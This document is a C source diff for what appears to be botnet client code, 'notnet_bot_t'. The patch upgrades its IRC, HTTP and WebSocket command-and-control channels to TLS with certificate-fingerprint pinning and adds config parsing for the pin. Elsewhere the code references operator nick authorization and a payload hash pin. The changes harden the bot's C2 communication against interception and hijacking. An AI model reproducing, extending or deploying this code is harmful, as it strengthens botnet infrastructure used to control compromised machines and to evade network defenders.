@@ -111,7 +111,15 @@ static int irc_create_socket(notnet_bot_t *bot) {
     
     /* Restore blocking mode for data transfer */
     fcntl(sock, F_SETFL, flags);
-    
+
+    /* SECURITY FIX (#76): Upgrade to TLS and verify cert pin when
+     * configured (make TLS=1 + tls_cert_pin_sha256=). */
+    if (tls_setup(&bot->c2_irc.tls, sock, bot->c2_irc.server,
+                  bot->tls_cert_pin_sha256) != 0) {
+        close(sock);
+        return -1;
+    }
+
     return sock;
 }
 
@@ -158,7 +166,7 @@ int irc_send(notnet_bot_t *bot, const char *format, ...) {
     char full_cmd[516];
     snprintf(full_cmd, sizeof(full_cmd), "%s\r\n", buf);
     
-    int sent = send(bot->c2_irc.sock, full_cmd, strlen(full_cmd), 0);
+    int sent = chan_send(&bot->c2_irc.tls, bot->c2_irc.sock, full_cmd, strlen(full_cmd));
     if (sent < 0) {
         log_error("IRC: send() failed: %s", strerror(errno));
         return -1;
@@ -173,16 +181,20 @@ int irc_send(notnet_bot_t *bot, const char *format, ...) {
 int irc_read(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_irc.connected) return -1;
     
-    fd_set fds;
-    struct timeval tv;
-    FD_ZERO(&fds);
-    FD_SET(bot->c2_irc.sock, &fds);
-    tv.tv_sec = 0;
-    tv.tv_usec = 0;
+    /* SECURITY FIX (#76): TLS may have decrypted bytes buffered that
+     * select() on the raw socket cannot see. */
+    if (tls_pending(&bot->c2_irc.tls) <= 0) {
+        fd_set fds;
+        struct timeval tv;
+        FD_ZERO(&fds);
+        FD_SET(bot->c2_irc.sock, &fds);
+        tv.tv_sec = 0;
+        tv.tv_usec = 0;
+
+        if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
+    }
     
-    if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
-    
-    int received = recv(bot->c2_irc.sock, buf, len, 0);
+    int received = chan_recv(&bot->c2_irc.tls, bot->c2_irc.sock, buf, len);
     if (received <= 0) {
         log_info("IRC: connection closed");
         bot->c2_irc.connected = 0;
@@ -328,6 +340,7 @@ void irc_disconnect(notnet_bot_t *bot) {
     if (bot->c2_irc.connected) {
         bot->c2_irc.connected = 0;
         if (bot->c2_irc.sock >= 0) {
+            tls_close(&bot->c2_irc.tls);
             close(bot->c2_irc.sock);
             bot->c2_irc.sock = -1;
         }
@@ -433,6 +446,13 @@ int http_connect(notnet_bot_t *bot) {
     
     fcntl(sock, F_SETFL, flags);
     
+    /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured. */
+    if (tls_setup(&bot->c2_http.tls, sock, bot->c2_http.server,
+                  bot->tls_cert_pin_sha256) != 0) {
+        close(sock);
+        return -1;
+    }
+
     bot->c2_http.sock = sock;
     bot->c2_http.connected = 1;
     /* SECURITY FIX (#45): Do NOT pin the peer IP here on the raw connect.
@@ -464,12 +484,12 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
     /* SECURITY FIX (#28): Check send() return values to detect connection
      * drops. Previously sent headers+body without checking if they were
      * actually transmitted. */
-    int sent = send(bot->c2_http.sock, headers, strlen(headers), 0);
+    int sent = chan_send(&bot->c2_http.tls, bot->c2_http.sock, headers, strlen(headers));
     if (sent < 0) {
         log_warn("HTTP: failed to send headers: %s", strerror(errno));
         return -1;
     }
-    sent = send(bot->c2_http.sock, data, len, 0);
+    sent = chan_send(&bot->c2_http.tls, bot->c2_http.sock, data, len);
     if (sent < 0 || sent < len) {
         log_warn("HTTP: failed to send body (sent %d of %d): %s", sent, len, strerror(errno));
         return -1;
@@ -511,7 +531,9 @@ int http_get(notnet_bot_t *bot, char *buf, int len) {
         return -1;
     }
 
-    /* Read response with 10s timeout to prevent indefinite blocking */
+    /* Read response with 10s timeout to prevent indefinite blocking.
+     * NOTE: this is a dedicated plaintext connection (tcp_connect_sock),
+     * not the TLS-upgraded channel socket, so raw send/recv apply. */
     int total = 0;
     while (total < len - 1) {
         fd_set read_fds;
@@ -540,18 +562,20 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
     log_info("HTTP: http_read polling fd %d...", bot->c2_http.sock);
     
     /* Read response from existing connection (non-blocking) */
-    fd_set fds;
-    struct timeval tv;
-    FD_ZERO(&fds);
-    FD_SET(bot->c2_http.sock, &fds);
-    tv.tv_sec = 0;
-    tv.tv_usec = 0;
+    if (tls_pending(&bot->c2_http.tls) <= 0) {
+        fd_set fds;
+        struct timeval tv;
+        FD_ZERO(&fds);
+        FD_SET(bot->c2_http.sock, &fds);
+        tv.tv_sec = 0;
+        tv.tv_usec = 0;
+
+        int sel_result = select(bot->c2_http.sock + 1, &fds, NULL, NULL, &tv);
+        log_info("HTTP: http_read select returned %d", sel_result);
+        if (sel_result <= 0) return 0;
+    }
     
-    int sel_result = select(bot->c2_http.sock + 1, &fds, NULL, NULL, &tv);
-    log_info("HTTP: http_read select returned %d", sel_result);
-    if (sel_result <= 0) return 0;
-    
-    int received = recv(bot->c2_http.sock, buf, len, 0);
+    int received = chan_recv(&bot->c2_http.tls, bot->c2_http.sock, buf, len);
     log_info("HTTP: http_read recv returned %d", received);
     if (received <= 0) {
         log_info("HTTP: connection closed (recv=%d)", received);
@@ -885,6 +909,7 @@ void http_disconnect(notnet_bot_t *bot) {
     if (bot->c2_http.connected) {
         bot->c2_http.connected = 0;
         if (bot->c2_http.sock >= 0) {
+            tls_close(&bot->c2_http.tls);
             close(bot->c2_http.sock);
             bot->c2_http.sock = -1;
         }
@@ -1046,7 +1071,16 @@ int ws_connect(notnet_bot_t *bot) {
         close(sock);
         return -1;
     }
-    
+
+    /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured.
+     * Must happen BEFORE the RFC 6455 handshake so the upgrade request and
+     * 101 response ride inside the encrypted tunnel. */
+    if (tls_setup(&bot->c2_ws.tls, sock, bot->c2_ws.server,
+                  bot->tls_cert_pin_sha256) != 0) {
+        close(sock);
+        return -1;
+    }
+
     /* SECURITY FIX (#46): Perform the RFC 6455 client handshake.
      * Raw TCP connect is not enough — the server must respond with
      * HTTP 101 Switching Protocols and a valid Sec-WebSocket-Accept
@@ -1079,7 +1113,7 @@ int ws_connect(notnet_bot_t *bot) {
         return -1;
     }
 
-    int sent = send(sock, upgrade_req, req_len, 0);
+    int sent = chan_send(&bot->c2_ws.tls, sock, upgrade_req, req_len);
     if (sent != req_len) {
         log_warn("WS: upgrade request send failed: %s", strerror(errno));
         close(sock);
@@ -1101,7 +1135,7 @@ int ws_connect(notnet_bot_t *bot) {
             close(sock);
             return -1;
         }
-        int r = recv(sock, response + received, sizeof(response) - received - 1, 0);
+        int r = chan_recv(&bot->c2_ws.tls, sock, response + received, sizeof(response) - received - 1);
         if (r <= 0) break;
         received += r;
         response[received] = '\0';
@@ -1238,13 +1272,13 @@ int ws_send(notnet_bot_t *bot, const char *data, int len) {
     ws_apply_mask((uint8_t *)masked, send_len, mask);
 
     /* Send header + masked payload */
-    int hdr_sent = send(bot->c2_ws.sock, header, hdr_len, 0);
+    int hdr_sent = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)header, hdr_len);
     if (hdr_sent < 0) {
         log_warn("ws_send: header send failed: %s", strerror(errno));
         free(masked);
         return -1;
     }
-    int result = send(bot->c2_ws.sock, masked, send_len, 0);
+    int result = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, masked, send_len);
     free(masked);
     return result;
 }
@@ -1252,14 +1286,16 @@ int ws_send(notnet_bot_t *bot, const char *data, int len) {
 int ws_read(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_ws.connected) return -1;
 
-    fd_set fds;
-    struct timeval tv;
-    FD_ZERO(&fds);
-    FD_SET(bot->c2_ws.sock, &fds);
-    tv.tv_sec = 0;
-    tv.tv_usec = 0;
+    if (tls_pending(&bot->c2_ws.tls) <= 0) {
+        fd_set fds;
+        struct timeval tv;
+        FD_ZERO(&fds);
+        FD_SET(bot->c2_ws.sock, &fds);
+        tv.tv_sec = 0;
+        tv.tv_usec = 0;
 
-    if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
+        if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
+    }
 
     /* SECURITY FIX (#40): read the full 2-byte frame header. A single
      * recv() can return 1 byte (partial read) — frame_hdr[1] would stay
@@ -1267,7 +1303,7 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
     uint8_t frame_hdr[2] = {0, 0};
     size_t hdr_got = 0;
     while (hdr_got < sizeof(frame_hdr)) {
-        ssize_t r = recv(bot->c2_ws.sock, frame_hdr + hdr_got, sizeof(frame_hdr) - hdr_got, 0);
+        ssize_t r = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)frame_hdr + hdr_got, sizeof(frame_hdr) - hdr_got);
         if (r <= 0) {
             bot->c2_ws.connected = 0;
             if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
@@ -1287,11 +1323,11 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
     int plen = payload_len;
     if (plen == 126) {
         uint8_t ext[2] = {0};
-        if (recv(bot->c2_ws.sock, (char *)ext, 2, 0) != 2) return -1;
+        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 2) != 2) return -1;
         plen = (ext[0] << 8) | ext[1];
     } else if (plen == 127) {
         uint8_t ext[8] = {0};
-        if (recv(bot->c2_ws.sock, (char *)ext, 8, 0) != 8) return -1;
+        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 8) != 8) return -1;
         plen = 0;
         for (int i = 0; i < 8; i++) {
             plen = (plen << 8) | ext[i];
@@ -1302,14 +1338,14 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
      * but we handle both cases) */
     uint8_t mask[4] = {0};
     if (masked) {
-        if (recv(bot->c2_ws.sock, (char *)mask, 4, 0) != 4) return -1;
+        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)mask, 4) != 4) return -1;
     }
 
     /* Read payload */
     if (plen > len - 1) plen = len - 1;
     int total = 0;
     while (total < plen) {
-        int n = recv(bot->c2_ws.sock, buf + total, plen - total, 0);
+        int n = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, buf + total, plen - total);
         if (n <= 0) break;
         total += n;
     }
@@ -1328,7 +1364,7 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
         if (opcode == 0x8) {
             /* Close frame - send close frame back and disconnect */
             uint8_t close_frame[] = { 0x88, 0x00 };
-            send(bot->c2_ws.sock, (char *)close_frame, 2, 0);
+            chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)close_frame, 2);
         }
         return 0;
     }
@@ -1341,6 +1377,7 @@ void ws_disconnect(notnet_bot_t *bot) {
     if (bot->c2_ws.connected) {
         bot->c2_ws.connected = 0;
         if (bot->c2_ws.sock >= 0) {
+            tls_close(&bot->c2_ws.tls);
             close(bot->c2_ws.sock);
             bot->c2_ws.sock = -1;
         }
@@ -2240,6 +2277,103 @@ int tls_init(notnet_tls_t *tls, int sock) {
     return 0;
 }
 
+/* SECURITY FIX (#76): Compute the SHA-256 fingerprint (hex) of the
+ * peer's certificate. Caller provides a 65-byte buffer. */
+static int tls_peer_fingerprint(notnet_tls_t *tls, char out[65]) {
+    if (!tls || !tls->ssl || !tls->enabled) return -1;
+    X509 *cert = SSL_get_peer_certificate(tls->ssl);
+    if (!cert) {
+        log_error("TLS: no peer certificate presented");
+        return -1;
+    }
+    unsigned char der[4096];
+    int der_len = i2d_X509(cert, NULL);
+    if (der_len <= 0 || der_len > (int)sizeof(der)) {
+        X509_free(cert);
+        return -1;
+    }
+    unsigned char *p = der;
+    i2d_X509(cert, &p);
+    X509_free(cert);
+
+    unsigned char digest[32];
+    SHA256(der, (size_t)der_len, digest);
+    static const char hexd[] = "0123456789abcdef";
+    for (int i = 0; i < 32; i++) {
+        out[i * 2]     = hexd[digest[i] >> 4];
+        out[i * 2 + 1] = hexd[digest[i] & 0x0F];
+    }
+    out[64] = '\0';
+    return 0;
+}
+
+/* SECURITY FIX (#76): Upgrade a connected socket to TLS and verify the
+ * peer certificate fingerprint against the configured pin. When TLS is
+ * not compiled in, or no pin is configured, the channel stays plaintext
+ * (tls->enabled = 0) and all I/O falls through to raw send/recv.
+ * Returns 0 on success (plaintext or verified TLS), -1 on failure. */
+int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
+              const char *pin_hex) {
+    if (!tls) return -1;
+    tls->sock = sock;
+    tls->enabled = 0;
+    tls->ssl = NULL;
+#ifdef TLS_ENABLED
+    if (!pin_hex || pin_hex[0] == '\0') {
+        log_info("TLS: no cert pin configured — channel stays plaintext");
+        return 0;
+    }
+    if (tls_init(tls, sock) != 0) return -1;
+    if (tls_handshake(tls, server_name) != 0) {
+        tls_close(tls);
+        return -1;
+    }
+    char fp[65];
+    if (tls_peer_fingerprint(tls, fp) != 0) {
+        tls_close(tls);
+        return -1;
+    }
+    if (strcmp(fp, pin_hex) != 0) {
+        log_error("TLS: cert fingerprint mismatch — expected %s, got %s",
+                  pin_hex, fp);
+        tls_close(tls);
+        return -1;
+    }
+    log_info("TLS: certificate fingerprint verified (%s)", fp);
+#else
+    if (pin_hex && pin_hex[0] != '\0') {
+        log_warn("TLS: cert pin configured but TLS not compiled in — "
+                 "run 'make TLS=1'; channel stays plaintext");
+    }
+#endif
+    return 0;
+}
+
+/* Channel I/O dispatchers: route through TLS when the channel is
+ * upgraded, otherwise fall back to the raw socket. */
+
+/* Bytes of decrypted data already buffered by the TLS layer (0 if TLS
+ * is off). Read loops must check this before select(), because select()
+ * only sees the raw socket, not SSL's internal buffer. */
+int tls_pending(notnet_tls_t *tls) {
+#ifdef TLS_ENABLED
+    if (tls && tls->enabled && tls->ssl) {
+        return SSL_pending(tls->ssl);
+    }
+#endif
+    return 0;
+}
+
+int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len) {
+    if (tls && tls->enabled) return tls_send(tls, buf, len);
+    return send(sock, buf, len, 0);
+}
+
+int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len) {
+    if (tls && tls->enabled) return tls_recv(tls, buf, len);
+    return recv(sock, buf, len, 0);
+}
+
 int tls_handshake(notnet_tls_t *tls, const char *server_name) {
     if (!tls || !tls->ssl) return -1;
 
@@ -2317,6 +2451,35 @@ int tls_init(notnet_tls_t *tls, int sock) {
     tls->enabled = 0;
     tls->ssl = NULL;
     return 0;
+}
+
+int tls_setup(notnet_tls_t *tls, int sock, const char *server_name,
+              const char *pin_hex) {
+    (void)server_name;
+    if (!tls) return -1;
+    tls->sock = sock;
+    tls->enabled = 0;
+    tls->ssl = NULL;
+    if (pin_hex && pin_hex[0] != '\0') {
+        log_warn("TLS: cert pin configured but TLS not compiled in — "
+                 "run 'make TLS=1'; channel stays plaintext");
+    }
+    return 0;
+}
+
+int tls_pending(notnet_tls_t *tls) {
+    (void)tls;
+    return 0;
+}
+
+int chan_send(notnet_tls_t *tls, int sock, const char *buf, int len) {
+    (void)tls;
+    return send(sock, buf, len, 0);
+}
+
+int chan_recv(notnet_tls_t *tls, int sock, char *buf, int len) {
+    (void)tls;
+    return recv(sock, buf, len, 0);
 }
 
 int tls_handshake(notnet_tls_t *tls, const char *server_name) {
@@ -2460,6 +2623,31 @@ int load_config(notnet_bot_t *bot, const char *path) {
                 log_info("Payload SHA-256 pin configured");
             } else {
                 log_warn("Config: payload_sha256 rejected — need 64 hex chars");
+            }
+        } else if (strcmp(key, "tls_cert_pin_sha256") == 0) {
+            /* SECURITY FIX (#76): TLS cert fingerprint pin. Validate 64
+             * hex chars like payload_sha256. */
+            int valid = 0;
+            if (strlen(value) == 64) {
+                valid = 1;
+                for (const char *p = value; *p; p++) {
+                    if (!((*p >= '0' && *p <= '9') ||
+                          (*p >= 'a' && *p <= 'f') ||
+                          (*p >= 'A' && *p <= 'F'))) {
+                        valid = 0;
+                        break;
+                    }
+                }
+            }
+            if (valid) {
+                for (int i = 0; i < 64; i++) {
+                    if (value[i] >= 'A' && value[i] <= 'F') value[i] += ('a' - 'A');
+                }
+                strncpy(bot->tls_cert_pin_sha256, value, 64);
+                bot->tls_cert_pin_sha256[64] = '\0';
+                log_info("TLS cert pin configured");
+            } else {
+                log_warn("Config: tls_cert_pin_sha256 rejected — need 64 hex chars");
             }
         } else if (strcmp(key, "irc_auth_nicks") == 0) {
             /* SECURITY FIX (#5): Comma-separated authorized C2 operator nicks.
